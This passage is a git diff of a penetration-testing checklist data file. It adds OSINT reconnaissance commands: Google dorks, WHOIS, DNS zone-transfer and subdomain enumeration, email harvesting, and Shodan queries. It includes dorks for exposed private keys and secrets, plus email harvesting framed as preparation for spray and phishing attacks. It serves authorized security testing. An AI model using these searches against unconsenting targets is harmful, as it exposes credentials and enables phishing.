@@ -1,4 +1,4 @@
-﻿/* ═══════════════════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════════
    Security Tracker – Checklist Data
    ═══════════════════════════════════════════════════════════════════
    EDITING GUIDE
@@ -72,11 +72,11 @@ const checklistPhases = [
       {
         "id": "osint-1",
         "name": "Google Dorking",
-        "description": "Use Google search operators to find exposed files, admin panels, and directory listings.",
+        "description": "Use Google search operators to find exposed files, admin panels, directory listings, leaked credentials, and misconfigurations. Combine operators for high-value discovery.",
         "commands": [
           {
             "desc": "Target Scoping",
-            "subdesc": "",
+            "subdesc": "Narrow or expand search to specific domains and subdomains.",
             "cmd": [
               "site:example.com",
               "site:*.example.com",
@@ -86,7 +86,7 @@ const checklistPhases = [
           },
           {
             "desc": "Logical Operators",
-            "subdesc": "",
+            "subdesc": "Combine search terms with AND/OR logic to refine and narrow dork queries",
             "cmd": [
               "example1 AND example2",
               "example1 OR example2",
@@ -97,7 +97,7 @@ const checklistPhases = [
           },
           {
             "desc": "Wildcards & Fuzzing",
-            "subdesc": "",
+            "subdesc": "Use wildcards to discover partial matches and expand search coverage",
             "cmd": [
               "example*test",
               "example * test",
@@ -107,7 +107,7 @@ const checklistPhases = [
           },
           {
             "desc": "Exact Matching / Ordering",
-            "subdesc": "",
+            "subdesc": "Force exact phrase matching for precise results on specific strings",
             "cmd": [
               "\"example1 example2\"",
               "\"example1 example2 example3\""
@@ -115,7 +115,7 @@ const checklistPhases = [
           },
           {
             "desc": "File Type Discovery",
-            "subdesc": "",
+            "subdesc": "Search for documents, configs, backups, and archives that may contain sensitive data.",
             "cmd": [
               "filetype:pdf",
               "filetype:doc",
@@ -140,12 +140,16 @@ const checklistPhases = [
               "filetype:xml",
               "filetype:yml",
               "filetype:yaml",
+              "filetype:pem",
+              "filetype:key",
+              "filetype:ovpn",
+              "filetype:rdp",
               "site:example.com filetype:sql"
             ]
           },
           {
             "desc": "URL-Based Discovery",
-            "subdesc": "",
+            "subdesc": "Find admin panels, login pages, API endpoints, and potentially injectable parameters.",
             "cmd": [
               "inurl:admin",
               "inurl:login",
@@ -162,15 +166,22 @@ const checklistPhases = [
               "inurl:api",
               "inurl:v1",
               "inurl:v2",
+              "inurl:graphql",
+              "inurl:swagger",
+              "inurl:api-docs",
               "inurl:php?id=",
               "inurl:cmd=",
               "inurl:exec=",
-              "inurl:query="
+              "inurl:query=",
+              "inurl:redirect=",
+              "inurl:url=",
+              "inurl:return=",
+              "inurl:next="
             ]
           },
           {
             "desc": "Page Content Discovery",
-            "subdesc": "",
+            "subdesc": "Search for sensitive strings in page content — credentials, keys, internal labels.",
             "cmd": [
               "intext:password",
               "intext:username",
@@ -180,34 +191,41 @@ const checklistPhases = [
               "intext:\"secret key\"",
               "intext:\"access token\"",
               "intext:\"confidential\"",
-              "intext:\"internal use only\""
+              "intext:\"internal use only\"",
+              "intext:\"do not distribute\"",
+              "intext:\"not for public release\""
             ]
           },
           {
             "desc": "Title-Based Discovery",
-            "subdesc": "",
+            "subdesc": "Find admin panels, directory listings, and server info via HTML page titles",
             "cmd": [
               "intitle:admin",
               "intitle:login",
               "intitle:dashboard",
               "intitle:index.of",
               "intitle:\"index of\"",
-              "intitle:\"parent directory\""
+              "intitle:\"parent directory\"",
+              "intitle:\"Apache Status\"",
+              "intitle:\"PHP Version\""
             ]
           },
           {
             "desc": "Directory Listings / Misconfigurations",
-            "subdesc": "",
+            "subdesc": "Exposed directory indexes often leak backup files, .git repos, configs, and credentials",
             "cmd": [
               "intitle:\"index of\" \"backup\"",
               "intitle:\"index of\" \".git\"",
               "intitle:\"index of\" \".env\"",
-              "intitle:\"index of\" \".ssh\""
+              "intitle:\"index of\" \".ssh\"",
+              "intitle:\"index of\" \"config\"",
+              "intitle:\"index of\" \"database\"",
+              "intitle:\"index of\" \"wp-content/uploads\""
             ]
           },
           {
             "desc": "Technology Fingerprinting",
-            "subdesc": "",
+            "subdesc": "Identify CMS platforms, admin tools, and internal services via URL patterns",
             "cmd": [
               "inurl:wp-admin",
               "inurl:wp-content",
@@ -216,69 +234,90 @@ const checklistPhases = [
               "intitle:phpMyAdmin",
               "inurl:jira",
               "inurl:confluence",
-              "inurl:jenkins"
+              "inurl:jenkins",
+              "inurl:grafana",
+              "inurl:kibana",
+              "inurl:gitlab",
+              "inurl:sonarqube"
             ]
           },
           {
             "desc": "Credentials & Secrets Leakage",
-            "subdesc": "",
+            "subdesc": "High-priority dorks for finding exposed secrets and private keys.",
             "cmd": [
               "filetype:env \"DB_PASSWORD\"",
               "filetype:env \"AWS_SECRET\"",
               "filetype:env \"API_KEY\"",
+              "filetype:env \"SMTP_PASSWORD\"",
               "filetype:json \"access_token\"",
               "filetype:yaml \"password:\"",
+              "filetype:properties \"jdbc:\"",
+              "filetype:xml \"connectionString\"",
               "intext:\"BEGIN RSA PRIVATE KEY\"",
-              "intext:\"BEGIN OPENSSH PRIVATE KEY\""
+              "intext:\"BEGIN OPENSSH PRIVATE KEY\"",
+              "intext:\"BEGIN PGP PRIVATE KEY\"",
+              "filetype:ppk \"PuTTY-User-Key-File\""
             ]
           },
           {
             "desc": "Cloud & DevOps Artifacts",
-            "subdesc": "",
+            "subdesc": "Find exposed IaC configs, container files, and cloud storage buckets",
             "cmd": [
-              "filetype:tf",
+              "filetype:tf \"aws_\"",
               "filetype:tfvars",
               "filetype:dockerfile",
               "filetype:docker-compose",
               "filetype:helm",
-              "filetype:kubeconfig"
+              "filetype:kubeconfig",
+              "filetype:yaml \"apiVersion\" \"kind\"",
+              "site:s3.amazonaws.com target",
+              "site:blob.core.windows.net target",
+              "site:storage.googleapis.com target"
             ]
           },
           {
             "desc": "Error & Debug Exposure",
-            "subdesc": "",
+            "subdesc": "Discover stack traces, error messages, and debug flags leaking internal details",
             "cmd": [
               "intext:\"stack trace\"",
               "intext:\"exception\"",
               "intext:\"fatal error\"",
-              "intext:\"debug=true\""
+              "intext:\"debug=true\"",
+              "intext:\"syntax error\" filetype:log",
+              "intext:\"Warning: mysql\" site:example.com"
             ]
           },
           {
             "desc": "User-Generated Content / Leaks",
-            "subdesc": "",
+            "subdesc": "Search code repos, paste sites, and Q&A sites for leaked target information.",
             "cmd": [
               "site:pastebin.com example.com",
               "site:github.com example.com",
               "site:gitlab.com example.com",
               "site:bitbucket.org example.com",
-              "site:stackoverflow.com \"example.com\""
+              "site:stackoverflow.com \"example.com\"",
+              "site:trello.com example.com",
+              "site:notion.site example.com",
+              "site:docs.google.com example.com"
             ]
           },
           {
             "desc": "Authentication & Access Control",
-            "subdesc": "",
+            "subdesc": "Find auth-related endpoints — password resets, SSO, OAuth, 2FA pages",
             "cmd": [
               "inurl:reset",
               "inurl:forgot",
               "inurl:password",
               "intitle:\"two-factor\"",
-              "intitle:\"2fa\""
+              "intitle:\"2fa\"",
+              "inurl:sso",
+              "inurl:oauth",
+              "inurl:saml"
             ]
           },
           {
             "desc": "Historical / Cached Data",
-            "subdesc": "",
+            "subdesc": "Access Google cache and Wayback Machine snapshots of target pages",
             "cmd": [
               "cache:example.com",
               "site:web.archive.org example.com"
@@ -286,7 +325,7 @@ const checklistPhases = [
           },
           {
             "desc": "Removals / Noise Reduction",
-            "subdesc": "",
+            "subdesc": "Filter out social media and irrelevant results to focus on target data",
             "cmd": [
               "-site:facebook.com",
               "-site:twitter.com",
@@ -296,11 +335,15 @@ const checklistPhases = [
           },
           {
             "desc": "High-Value Combined Patterns",
-            "subdesc": "",
+            "subdesc": "Stack multiple operators for precise, high-impact results.",
             "cmd": [
               "site:example.com (filetype:env OR filetype:conf)",
               "(inurl:admin OR inurl:login) site:example.com",
-              "intitle:\"index of\" (backup OR db OR sql)"
+              "intitle:\"index of\" (backup OR db OR sql)",
+              "site:example.com intext:password filetype:log",
+              "site:example.com (filetype:sql OR filetype:bak OR filetype:old)",
+              "site:example.com inurl:api (intext:key OR intext:token)",
+              "site:example.com ext:php inurl:config"
             ]
           }
         ]
@@ -308,25 +351,25 @@ const checklistPhases = [
       {
         "id": "osint-2",
         "name": "WHOIS Lookup",
-        "description": "Identify registration and ownership details for a domain or IP address.",
+        "description": "Identify registration and ownership details for a domain or IP address. Pivot from WHOIS data to expand scope by finding related infrastructure.",
         "commands": [
           {
             "desc": "Basic Domain Registration",
-            "subdesc": "",
+            "subdesc": "Returns registrar, name servers, dates, contacts — first step in passive recon",
             "cmd": [
               "whois target.com"
             ]
           },
           {
             "desc": "Subdomain (may fall back to parent domain)",
-            "subdesc": "",
+            "subdesc": "WHOIS may not resolve subdomains — falls back to parent domain registration data",
             "cmd": [
               "whois sub.target.com"
             ]
           },
           {
             "desc": "IP Address Registration",
-            "subdesc": "",
+            "subdesc": "Look up IP ownership, netblock, and abuse contacts via RIR databases",
             "cmd": [
               "whois 10.10.10.5",
               "whois 8.8.8.8"
@@ -334,14 +377,14 @@ const checklistPhases = [
           },
           {
             "desc": "CIDR / Netblock Ownership",
-            "subdesc": "",
+            "subdesc": "Identify the full IP range allocated to the target organization",
             "cmd": [
               "whois 10.10.10.0/24"
             ]
           },
           {
             "desc": "TLD-Specific WHOIS (bypasses generic resolvers)",
-            "subdesc": "",
+            "subdesc": "Query TLD authoritative WHOIS servers directly for more complete data",
             "cmd": [
               "whois -h whois.verisign-grs.com target.com",
               "whois -h whois.iana.org target.com"
@@ -349,7 +392,7 @@ const checklistPhases = [
           },
           {
             "desc": "Registrar-Specific WHOIS",
-            "subdesc": "",
+            "subdesc": "Query the registrar WHOIS server for additional registration details",
             "cmd": [
               "whois -h whois.godaddy.com target.com",
               "whois -h whois.namecheap.com target.com"
@@ -357,7 +400,7 @@ const checklistPhases = [
           },
           {
             "desc": "Nameserver Enumeration",
-            "subdesc": "",
+            "subdesc": "Extract nameservers — pivot to zone transfer testing and DNS enumeration",
             "cmd": [
               "whois target.com | grep -i \"name server\"",
               "whois target.com | grep -i \"nserver\""
@@ -365,7 +408,7 @@ const checklistPhases = [
           },
           {
             "desc": "Registrar / Organization / Abuse Contacts",
-            "subdesc": "",
+            "subdesc": "Identify registrar, organization name, and abuse contact for the domain",
             "cmd": [
               "whois target.com | grep -i \"registrar\"",
               "whois target.com | grep -i \"org\"",
@@ -374,7 +417,7 @@ const checklistPhases = [
           },
           {
             "desc": "Dates (Attack Surface Timing)",
-            "subdesc": "",
+            "subdesc": "Recently updated domains may have new infrastructure changes worth investigating.",
             "cmd": [
               "whois target.com | grep -i \"creation\"",
               "whois target.com | grep -i \"updated\"",
@@ -383,14 +426,14 @@ const checklistPhases = [
           },
           {
             "desc": "Reverse WHOIS (email / org reuse indicators)",
-            "subdesc": "",
+            "subdesc": "Find other domains registered with the same email or organization.",
             "cmd": [
               "whois target.com | grep -Ei \"email|e-mail|mail\""
             ]
           },
           {
             "desc": "ASN Discovery (pivot to infrastructure scope)",
-            "subdesc": "",
+            "subdesc": "Find the Autonomous System Number for the target's IP space — pivot to netblock discovery",
             "cmd": [
               "whois 10.10.10.5 | grep -i \"origin\"",
               "whois 10.10.10.5 | grep -i \"asn\""
@@ -398,7 +441,7 @@ const checklistPhases = [
           },
           {
             "desc": "RIR-Specific Queries",
-            "subdesc": "",
+            "subdesc": "Query the specific Regional Internet Registry for more detailed IP ownership info.",
             "cmd": [
               "whois -h whois.arin.net 10.10.10.5",
               "whois -h whois.ripe.net 10.10.10.5",
@@ -409,7 +452,7 @@ const checklistPhases = [
           },
           {
             "desc": "Organization Netblocks (scope expansion candidate)",
-            "subdesc": "",
+            "subdesc": "Discover the full IP range and CIDR block allocated to the target organization",
             "cmd": [
               "whois 10.10.10.5 | grep -i \"netrange\"",
               "whois 10.10.10.5 | grep -i \"cidr\""
@@ -417,14 +460,14 @@ const checklistPhases = [
           },
           {
             "desc": "Privacy / Proxy Detection",
-            "subdesc": "",
+            "subdesc": "Check if WHOIS data is hidden behind privacy protection or proxy services",
             "cmd": [
               "whois target.com | grep -Ei \"privacy|proxy|redacted\""
             ]
           },
           {
             "desc": "Email Infrastructure Clues",
-            "subdesc": "",
+            "subdesc": "Extract mail-related records from WHOIS data to identify email infrastructure",
             "cmd": [
               "whois target.com | grep -Ei \"mx|mail\""
             ]
@@ -434,60 +477,119 @@ const checklistPhases = [
       {
         "id": "osint-3",
         "name": "DNS Enumeration",
-        "description": "Enumerate DNS records to map infrastructure and find weak points.",
+        "description": "Enumerate DNS records to map infrastructure, discover hidden services, and find misconfigurations like zone transfer vulnerabilities.",
         "commands": [
           {
             "desc": "DNS Banner Grabbing",
-            "subdesc": "",
+            "subdesc": "Identify DNS server software version for vulnerability research.",
             "cmd": [
               "dig @<TARGET_IP> version.bind CHAOS TXT",
               "nmap -sV -p 53 --script=dns-nsid -Pn <TARGET_IP>"
             ]
           },
           {
-            "desc": "DNS Enumeration",
-            "subdesc": "",
+            "desc": "Standard Record Queries",
+            "subdesc": "Query specific DNS record types to map infrastructure. A=IPv4, AAAA=IPv6, MX=mail, NS=nameservers, TXT=SPF/DKIM/DMARC, SOA=zone info, SRV=services, CNAME=aliases.",
             "cmd": [
-              "whois <DOMAIN_OR_IP>",
-              "host <HOSTNAME> <DNS_SERVER>",
-              "host -l <DOMAIN> <DNS_SERVER>",
+              "dig @<DNS_SERVER> <DOMAIN> A",
+              "dig @<DNS_SERVER> <DOMAIN> AAAA",
+              "dig @<DNS_SERVER> <DOMAIN> MX",
+              "dig @<DNS_SERVER> <DOMAIN> NS",
+              "dig @<DNS_SERVER> <DOMAIN> TXT",
+              "dig @<DNS_SERVER> <DOMAIN> SOA",
+              "dig @<DNS_SERVER> <DOMAIN> SRV",
+              "dig @<DNS_SERVER> <DOMAIN> CNAME",
+              "dig @<DNS_SERVER> <DOMAIN> ANY",
+              "dig +short <DOMAIN> A",
+              "dig +short <DOMAIN> MX",
+              "dig +short <DOMAIN> NS"
+            ]
+          },
+          {
+            "desc": "Reverse DNS Lookups",
+            "subdesc": "Resolve IP addresses back to hostnames — useful for discovering additional domains on shared infrastructure.",
+            "cmd": [
               "dig @<DNS_SERVER> -x <IP_ADDRESS>",
-              "dig @<DNS_SERVER> <DOMAIN> <RECORD_TYPE>",
-              "dig @ns1.<DOMAIN> <DOMAIN> <RECORD_TYPE>"
+              "host <IP_ADDRESS>",
+              "nslookup <IP_ADDRESS>",
+              "for ip in $(seq 1 254); do host 10.10.10.$ip <DNS_SERVER> 2>/dev/null | grep 'name pointer'; done"
+            ]
+          },
+          {
+            "desc": "DNS Enumeration (host / nslookup)",
+            "subdesc": "Alternative DNS query tools — lightweight and useful when dig is unavailable",
+            "cmd": [
+              "host <HOSTNAME> <DNS_SERVER>",
+              "host -t mx <DOMAIN>",
+              "host -t ns <DOMAIN>",
+              "host -t txt <DOMAIN>",
+              "host -l <DOMAIN> <DNS_SERVER>",
+              "nslookup <DOMAIN>",
+              "nslookup -type=mx <DOMAIN>",
+              "nslookup -type=ns <DOMAIN>",
+              "nslookup -type=soa <DOMAIN>"
+            ]
+          },
+          {
+            "desc": "DNS Zone Transfer Attacks",
+            "subdesc": "Zone transfers (AXFR) expose the entire DNS zone if misconfigured — reveals all subdomains, IPs, and records.",
+            "cmd": [
+              "dig @<DOMAIN_IP> <DOMAIN> AXFR",
+              "dig @ns1.<DOMAIN> <DOMAIN> AXFR",
+              "host -T -l <DOMAIN> <DNS_SERVER>",
+              "host -l <DOMAIN> <DNS_SERVER>",
+              "dnsrecon -d <DOMAIN> -a",
+              "dnsrecon -d <DOMAIN> -t axfr",
+              "fierce --domain <DOMAIN>"
             ]
           },
           {
             "desc": "TLS CN → DNS Zone Transfer Check",
-            "subdesc": "Nmap shows TLS cert with commonName=mysite.test. DNS service is running — test for misconfigured AXFR.",
+            "subdesc": "If nmap shows a TLS cert with commonName=mysite.test and DNS service is running, test for misconfigured AXFR.",
             "cmd": [
               "host -T -l <DOMAIN.LOCAL> <TARGET_IP>"
             ]
           },
           {
-            "desc": "Post-Zone-Transfer: HTTP Host Enumeration",
-            "subdesc": "",
+            "desc": "DNS Brute Force Enumeration",
+            "subdesc": "Brute force subdomains through the DNS server directly.",
             "cmd": [
-              "gobuster dns -r <TARGET_IP> -d <DOMAIN.LOCAL> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
-              "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
+              "dnsenum <DOMAIN>",
+              "dnsenum --dnsserver <DNS_SERVER> --enum <DOMAIN>",
+              "dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt",
+              "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
+              "gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100"
             ]
           },
           {
-            "desc": "DNS Zone Transfer Attacks",
-            "subdesc": "",
+            "desc": "Virtual Host (VHost) Discovery",
+            "subdesc": "Find sites hosted on the same server using different Host headers.",
             "cmd": [
-              "dig @<DOMAIN_IP> <DOMAIN> AXFR",
-              "dnsrecon -d <DOMAIN> -a"
+              "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185",
+              "gobuster vhost -u http://<RHOST> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+              "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.<RHOST>\" --hc 404 http://<RHOST>"
+            ]
+          },
+          {
+            "desc": "Email Security Records",
+            "subdesc": "Check for SPF, DKIM, and DMARC — missing records = spoofing/phishing opportunity.",
+            "cmd": [
+              "dig +short <DOMAIN> TXT | grep spf",
+              "dig +short _dmarc.<DOMAIN> TXT",
+              "dig +short default._domainkey.<DOMAIN> TXT",
+              "nmap -p 25 --script smtp-open-relay <TARGET_IP>",
+              "nmap --script=dns-srv-enum -p 53 <DNS_SERVER>"
             ]
           },
           {
             "desc": "DNS Configuration Files (Linux)",
-            "subdesc": "",
+            "subdesc": "If you have local/post-exploit access, check DNS configuration files.",
             "cmd": [
-              "/etc/host.conf",
-              "/etc/resolv.conf",
-              "/etc/named.conf",
-              "/etc/bind/named.conf",
-              "/etc/bind/named.conf.local"
+              "cat /etc/host.conf",
+              "cat /etc/resolv.conf",
+              "cat /etc/named.conf",
+              "cat /etc/bind/named.conf",
+              "cat /etc/bind/named.conf.local"
             ]
           }
         ]
@@ -495,89 +597,400 @@ const checklistPhases = [
       {
         "id": "osint-4",
         "name": "Subdomain Enumeration",
-        "description": "Discover subdomains using passive and active enumeration methods.",
+        "description": "Discover subdomains using passive (API-based) and active (brute force, permutation) enumeration methods. Combine multiple tools for maximum coverage.",
         "commands": [
           {
-            "desc": "Passive Subdomain Discovery (Primary)",
-            "subdesc": "",
+            "desc": "Install Subdomain Enumeration Tools",
+            "subdesc": "Most of these are Go-based — install Go first, then use go install. Alternatively, download pre-compiled binaries from GitHub releases.",
+            "cmd": [
+              "# Install Go (if not installed)",
+              "sudo apt install -y golang-go",
+              "",
+              "# ProjectDiscovery tools (subfinder, httpx, nuclei)",
+              "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+              "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
+              "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+              "go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest",
+              "",
+              "# Other Go tools",
+              "go install -v github.com/tomnomnom/assetfinder@latest",
+              "go install -v github.com/tomnomnom/httprobe@latest",
+              "go install -v github.com/sensepost/gowitness@latest",
+              "go install -v github.com/OJ/gobuster/v3@latest",
+              "go install -v github.com/Josue87/gotator@latest",
+              "go install -v github.com/haccer/subjack@latest",
+              "",
+              "# Rust / other binaries",
+              "# findomain: download from https://github.com/Edu4rdSHL/findomain/releases",
+              "",
+              "# Python tools",
+              "pip install altdns",
+              "",
+              "# massdns (compile from source)",
+              "git clone https://github.com/blechschmidt/massdns.git && cd massdns && make && sudo make install",
+              "",
+              "# Add Go bin to PATH (add to .bashrc/.zshrc)",
+              "export PATH=$PATH:$(go env GOPATH)/bin"
+            ]
+          },
+          {
+            "desc": "Passive Subdomain Discovery (subfinder)",
+            "subdesc": "Queries 40+ passive sources (crt.sh, VirusTotal, Shodan, SecurityTrails, etc.).",
             "cmd": [
               "subfinder -d target.com -silent -o subdomains.txt",
-              "subfinder -d target.com -all -recursive -json -o subfinder.json"
+              "subfinder -d target.com -all -recursive -json -o subfinder.json",
+              "subfinder -d target.com -all -silent | sort -u > subs.txt"
             ]
           },
           {
-            "desc": "Multi-Source Subdomain Enumeration",
-            "subdesc": "",
+            "desc": "Passive Subdomain Discovery (amass)",
+            "subdesc": "Deep passive and active enumeration with graph database support.",
             "cmd": [
               "amass enum -passive -d target.com -o amass_passive.txt",
-              "amass enum -passive -d target.com -src -d target.com -o amass_sources.txt"
+              "amass enum -passive -d target.com -src -o amass_sources.txt",
+              "amass intel -d target.com -whois"
             ]
           },
           {
-            "desc": "Active Subdomain Enumeration (Escalation)",
-            "subdesc": "Use only when allowed by scope.",
+            "desc": "Active Subdomain Enumeration",
+            "subdesc": "Active DNS brute-forcing — use only when allowed by scope.",
             "cmd": [
               "amass enum -active -d target.com -o amass_active.txt",
-              "amass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt"
+              "amass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt",
+              "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100",
+              "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.target.com -mc 200,301,302,403"
+            ]
+          },
+          {
+            "desc": "Certificate Transparency Logs",
+            "subdesc": "crt.sh queries Certificate Transparency logs for all certificates issued to a domain — reveals subdomains the org may not intend to be public.",
+            "cmd": [
+              "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u",
+              "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crt_subs.txt"
+            ]
+          },
+          {
+            "desc": "Assetfinder & Other Tools",
+            "subdesc": "Lightweight tools for quick subdomain enumeration.",
+            "cmd": [
+              "assetfinder target.com | sort -u",
+              "assetfinder --subs-only target.com",
+              "findomain -t target.com -u findomain_subs.txt",
+              "chaos -d target.com -silent"
+            ]
+          },
+          {
+            "desc": "Subdomain Permutation & Alteration",
+            "subdesc": "Generate permutations of known subdomains to find patterns like dev-api, api-staging, etc.",
+            "cmd": [
+              "altdns -i subdomains.txt -o permutation_output.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -s results.txt",
+              "gotator -sub subdomains.txt -perm /usr/share/seclists/Discovery/DNS/dns-prefixes.txt -depth 1 -numbers 3 | massdns -r resolvers.txt -o S -w resolved.txt"
+            ]
+          },
+          {
+            "desc": "Probe Live Subdomains",
+            "subdesc": "Filter discovered subdomains to only those that are actually responding.",
+            "cmd": [
+              "cat subdomains.txt | httprobe -prefer-https | tee alive.txt",
+              "httpx -l subdomains.txt -silent -status-code -title -tech-detect -o httpx_results.txt",
+              "httpx -l subdomains.txt -silent -sc -cl -ct -title -server -td -cdn -o httpx_full.txt"
+            ]
+          },
+          {
+            "desc": "Visual Recon (Screenshots)",
+            "subdesc": "Capture screenshots of all discovered live subdomains for rapid visual analysis.",
+            "cmd": [
+              "gowitness file -f alive.txt -P screenshots/ --no-http",
+              "eyewitness --web -f alive.txt -d eyewitness_output/ --no-prompt"
+            ]
+          },
+          {
+            "desc": "Subdomain Takeover Detection",
+            "subdesc": "Check if any discovered subdomains have dangling CNAME records that could be claimed.",
+            "cmd": [
+              "subjack -w subdomains.txt -t 100 -timeout 30 -o takeover_results.txt -ssl",
+              "nuclei -l subdomains.txt -t takeovers/ -o nuclei_takeover.txt",
+              "cat subdomains.txt | while read sub; do cname=$(dig +short CNAME $sub); [ -n \"$cname\" ] && echo \"$sub -> $cname\"; done"
             ]
           }
         ]
       },
       {
         "id": "osint-5",
-        "name": "Email Harvesting",
-        "description": "Collect email addresses linked to the target domain from all available public sources.",
+        "name": "Email Harvesting & OSINT",
+        "description": "Discover, verify, and harvest email addresses tied to a target domain. Identify email format patterns for spray attacks. Combine CLI tools with online services.",
         "commands": [
           {
-            "desc": "Harvest emails and names from all available public sources",
-            "subdesc": "",
+            "desc": "theHarvester (Multi-Source)",
+            "subdesc": "Queries search engines, PGP servers, Shodan, and more for emails, subdomains, hosts, and names.",
             "cmd": [
-              "theHarvester -d target.com -b all"
+              "theHarvester -d target.com -b all",
+              "theHarvester -d target.com -b google,bing,linkedin,yahoo",
+              "theHarvester -d target.com -b all -l 500 -f results.html",
+              "theHarvester -d target.com -b crtsh,dnsdumpster,certspotter"
+            ]
+          },
+          {
+            "desc": "Email Discovery Platforms (Online)",
+            "subdesc": "Web-based tools for discovering email addresses and format patterns.",
+            "cmd": [
+              "https://hunter.io/               # Email finder + format detection",
+              "https://phonebook.cz/             # Email, domain, URL search",
+              "https://www.voilanorbert.com/      # Email finder by name + domain",
+              "https://snov.io/                   # Email finder + verifier",
+              "https://rocketreach.co/            # Email + phone lookup"
+            ]
+          },
+          {
+            "desc": "Email Verification",
+            "subdesc": "Verify discovered emails are valid before using in attacks — reduces bounce detection.",
+            "cmd": [
+              "https://tools.verifyemailaddress.io/",
+              "https://email-checker.net/validate",
+              "emailhippo <EMAIL_ADDRESS>"
+            ]
+          },
+          {
+            "desc": "LinkedIn Email Harvesting",
+            "subdesc": "Build employee email lists from LinkedIn profiles. Install: pip install crosslinked | linkedin2username: git clone https://github.com/initstring/linkedin2username",
+            "cmd": [
+              "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME> -s <COMPANY_SIZE>",
+              "crosslinked -f '{first}.{last}@target.com' -j 3 'Company Name'"
+            ]
+          },
+          {
+            "desc": "SMTP Enumeration",
+            "subdesc": "If SMTP is reachable, enumerate valid email addresses directly through the mail server.",
+            "cmd": [
+              "smtp-user-enum -M VRFY -U users.txt -t <MAIL_SERVER>",
+              "smtp-user-enum -M RCPT -U users.txt -t <MAIL_SERVER>",
+              "smtp-user-enum -M EXPN -U users.txt -t <MAIL_SERVER>",
+              "nmap --script smtp-enum-users -p 25 <MAIL_SERVER>"
+            ]
+          },
+          {
+            "desc": "Clearbit Connect",
+            "subdesc": "Chrome extension that reveals email addresses and company info directly in Gmail.",
+            "cmd": [
+              "Install Clearbit Connect Chrome extension",
+              "Open Gmail → Compose → Click Clearbit icon → Search by name + company"
             ]
           }
         ]
       },
       {
         "id": "osint-6",
-        "name": "Shodan / Censys Recon",
-        "description": "Find exposed services, open ports, and banners indexed by Shodan.",
+        "name": "Shodan / Censys / Search Engines",
+        "description": "Find exposed services, open ports, banners, vulnerabilities, and IoT devices indexed by internet-wide scanners. No direct scanning needed — passive reconnaissance.",
         "commands": [
           {
-            "desc": "Search for all services associated with the target domain",
-            "subdesc": "",
+            "desc": "Shodan CLI — Host & Domain Lookup",
+            "subdesc": "Query Shodan's database for all indexed data on a target.",
             "cmd": [
-              "shodan search hostname:target.com"
+              "shodan host <TARGET_IP>",
+              "shodan search hostname:target.com",
+              "shodan domain target.com",
+              "shodan count hostname:target.com"
             ]
           },
           {
-            "desc": "Inspect all exposed services and banners on a specific IP",
-            "subdesc": "",
+            "desc": "Shodan Search Filters",
+            "subdesc": "Powerful filters for narrowing results to specific services, vulnerabilities, and configurations.",
             "cmd": [
-              "shodan host <TARGET_IP>"
+              "shodan search 'hostname:target.com port:443'",
+              "shodan search 'org:\"Target Company\" port:3389'",
+              "shodan search 'ssl.cert.subject.cn:target.com'",
+              "shodan search 'net:10.10.10.0/24'",
+              "shodan search 'product:Apache city:\"New York\"'",
+              "shodan search 'vuln:CVE-2021-44228'",
+              "shodan search 'http.title:\"Dashboard\" org:\"Target Company\"'",
+              "shodan search 'port:445 os:\"Windows\" org:\"Target\"'",
+              "shodan search 'http.favicon.hash:<HASH>'",
+              "shodan search 'ssl:\"target.com\" 200'"
+            ]
+          },
+          {
+            "desc": "Shodan Web Interface Dorks",
+            "subdesc": "Use these directly on shodan.io search bar.",
+            "cmd": [
+              "hostname:target.com",
+              "org:\"Target Company\"",
+              "net:10.10.10.0/24",
+              "ssl.cert.issuer.cn:\"Let's Encrypt\"",
+              "http.component:\"WordPress\"",
+              "product:\"OpenSSH\" port:22",
+              "http.status:200 hostname:target.com",
+              "has_screenshot:true hostname:target.com"
+            ]
+          },
+          {
+            "desc": "Censys Search",
+            "subdesc": "Alternative to Shodan with different scanning coverage and certificate search.",
+            "cmd": [
+              "https://search.censys.io/",
+              "censys search 'services.tls.certificates.leaf.names: target.com'",
+              "censys search 'ip: 10.10.10.5'",
+              "censys search 'services.http.response.html_title: \"target\"'"
+            ]
+          },
+          {
+            "desc": "Other Search Engines",
+            "subdesc": "Alternative internet scanning platforms with different coverage and focus areas",
+            "cmd": [
+              "https://www.zoomeye.org/         # Chinese Shodan equivalent",
+              "https://fofa.info/               # Chinese search engine for internet assets",
+              "https://www.binaryedge.io/       # Internet scan data",
+              "https://www.onyphe.io/           # Cyber defense search engine",
+              "https://hunter.how/              # Global internet asset search"
             ]
           }
         ]
       },
       {
         "id": "osint-7",
-        "name": "Social Media / LinkedIn Recon",
-        "description": "Manually gather employee names, job titles, technology stack clues, and org structure from LinkedIn, Twitter, and company pages.",
-        "commands": []
+        "name": "Social Media & LinkedIn Recon",
